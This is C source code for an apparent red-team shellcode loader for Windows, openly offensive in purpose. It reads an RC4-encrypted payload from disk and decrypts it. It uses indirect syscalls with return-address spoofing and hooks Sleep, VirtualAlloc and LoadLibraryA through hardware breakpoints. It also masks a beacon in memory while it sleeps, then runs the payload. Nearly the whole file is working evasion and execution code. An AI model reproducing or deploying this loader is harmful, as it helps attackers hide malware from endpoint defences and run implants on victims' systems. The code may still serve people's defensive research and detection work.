#include <stdio.h>
#include <Windows.h>

#include "ntdll.h"
#include "api.h"
#include "hash_k32.h"
#include "hash_ntdll.h"
#include "syscalls.h"
#include "spoof.h"
#include "kraken.h"
#include "rc4.h"
#include "hwbp.h"
#include "loaddll.h"


// GLOBAL VAR
DWORD g_dwReadedSizePayload = 0;
PVOID g_pReadedPayloadAddr = NULL;

PVOID g_pBeaconAddr = NULL;
DWORD g_dwBeaconSize = 0;

PSYSCALL g_Syscall = NULL;
LOADER_INSTANCE LdrInst = { 0 };


BOOL TakeShellcodeFromFile(PSYSCALL syscall)
{
	BYTE shellcodePath[] = "YOUR_PATH";

	HANDLE hFile = SPOOF(CreateFileA, shellcodePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	g_dwReadedSizePayload = GetFileSize(hFile, NULL);
	
	ntPrepare(syscall->NtAllocateVirtualMemory.dwSyscall, syscall->NtAllocateVirtualMemory.pJmpAddr);
	NTSTATUS status = SPOOF(ntCall, (HANDLE)-1, &g_pReadedPayloadAddr, 0, (SIZE_T) &g_dwReadedSizePayload, MEM_COMMIT, PAGE_READWRITE);

	if (status != NULL)
		return FALSE;

	if (!SPOOF(ReadFile, hFile, g_pReadedPayloadAddr, g_dwReadedSizePayload, NULL, NULL))
		return FALSE;

	if (!SPOOF(CloseHandle, hFile))

		return FALSE;

	USTRING payload = { 0 };
	payload.Buffer = g_pReadedPayloadAddr;
	payload.Length = payload.MaximumLength = g_dwReadedSizePayload;

	BYTE keyEncrypt[] = "YOUR_KEY";

	DWORD dwKeySize = sizeof(keyEncrypt);

	USTRING key = { 0 };
	key.Buffer = keyEncrypt;
	key.Length = key.MaximumLength = dwKeySize;

	SystemFunction032(&payload, &key);

	return TRUE;
}

LONG WINAPI handler(EXCEPTION_POINTERS* ExceptionInfo) {

	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {

		if (ExceptionInfo->ContextRecord->Rip == (DWORD64)LdrInst.hook.wFunction.pSleep) {

			DWORD dwSleepTime = ExceptionInfo->ContextRecord->Rcx;

			if (g_pReadedPayloadAddr != NULL)
			{

				PVOID pAddr = g_pReadedPayloadAddr;
				SIZE_T sSize = 0;
				ULONG uFreeType = MEM_DECOMMIT;

				ntPrepare(g_Syscall->NtFreeVirtualMemory.dwSyscall, g_Syscall->NtFreeVirtualMemory.pJmpAddr);
				NTSTATUS status = SPOOF(ntCall, (HANDLE)-1, &pAddr, &sSize, uFreeType);

				if (status != 0)
					printf("[!] Can't free virtual memory ! STATUS : %p\n", status);

				g_pReadedPayloadAddr = NULL;
			}

			printf("----- SLEEP HOOK -----\n");
			printf("Sleep for %d ms, redirect to KrakenMask !\n", dwSleepTime);

			KrakenSleep(dwSleepTime, g_pBeaconAddr, g_dwBeaconSize);
			ExceptionInfo->ContextRecord->Rip = (DWORD64)FindRetGadget(LdrInst.hook.wFunction.pSleep);

		}
		if (ExceptionInfo->ContextRecord->Rip == (DWORD64)LdrInst.hook.wFunction.pLoadLibraryA) {

			printf("----- LOADLIBRARYA HOOK -----\n");
			printf("Redirect LoadLibraryA to LdrLoadDll with spoofed ret addr ! \n");
			HMODULE hRax = LoadLib(ExceptionInfo->ContextRecord->Rcx);
			ExceptionInfo->ContextRecord->Rax = (DWORD64)hRax;
			printf("Dll : %s loaded at : %p\n", ExceptionInfo->ContextRecord->Rcx, hRax);

			ExceptionInfo->ContextRecord->Rip = (DWORD64)FindRetGadget(LdrInst.hook.wFunction.pLoadLibraryA);
		}
		if (ExceptionInfo->ContextRecord->Rip == (DWORD64)LdrInst.hook.wFunction.pVirtualAlloc) {

			SIZE_T stAllocSize = ExceptionInfo->ContextRecord->Rdx;
			g_dwBeaconSize = stAllocSize;
			ULONG uAllocationType = (ULONG)ExceptionInfo->ContextRecord->R8;
			ULONG uProtect = (ULONG)ExceptionInfo->ContextRecord->R9;

			ntPrepare(g_Syscall->NtAllocateVirtualMemory.dwSyscall, g_Syscall->NtAllocateVirtualMemory.pJmpAddr);
			NTSTATUS status = SPOOF(ntCall, (HANDLE)-1, &g_pBeaconAddr, NULL, &stAllocSize, uAllocationType, uProtect);

			ExceptionInfo->ContextRecord->Rax = (DWORD64)g_pBeaconAddr;

			printf("----- VIRTUALALLOC HOOK -----\n");
			printf("pAddr : %p Size : %d \n", g_pBeaconAddr, stAllocSize);
			ExceptionInfo->ContextRecord->Rip = (DWORD64)FindRetGadget(LdrInst.hook.wFunction.pVirtualAlloc);

			if (!RemoveHWBP(GetCurrentThread(), 1, g_Syscall))
				printf("[!] Can't remove the HWBP-Hook for VirtualAlloc !\n");

		}

		return EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}

int main() {

	SYSCALL syscall = { 0 };

	g_Syscall = &syscall;
	syscall.pNtdll = fnGetModuleHandle(0x22d3b5ed);

	InitLoaderInstance(&LdrInst);

	if (!InitSyscall(&syscall))
		return EXIT_FAILURE;

	if (!TakeShellcodeFromFile(&syscall))
		return EXIT_FAILURE;

	HANDLE hThread = SPOOF(LdrInst.main.wFunction.pGetCurrentThread);

	if (!SetHWBP(hThread, 0, LdrInst.hook.wFunction.pVirtualAlloc, &syscall))
		printf("[!] Can't set hook !\n");

	if (!SetHWBP(hThread, 1, LdrInst.hook.wFunction.pSleep, &syscall))
		printf("[!] Can't set hook !\n");

	if (!SetHWBP(hThread, 2, LdrInst.hook.wFunction.pLoadLibraryA, &syscall))
		printf("[!] Can't set hook !\n");

	
	SPOOF(LdrInst.main.wFunction.pCloseHandle, hThread);
	SPOOF(LdrInst.main.wFunction.pAddVectoredExceptionHandler, 1, &handler);

	ULONG uOldProtect = 0;
	ntPrepare(syscall.NtProtectVirtualMemory.dwSyscall, syscall.NtProtectVirtualMemory.pJmpAddr);
	NTSTATUS status = SPOOF(ntCall, (HANDLE)-1, &g_pReadedPayloadAddr, (SIZE_T)&g_dwReadedSizePayload, PAGE_EXECUTE_READ, &uOldProtect);
	if (status != 0)
		return FALSE;

	SPOOF(g_pReadedPayloadAddr);

	return EXIT_SUCCESS;
}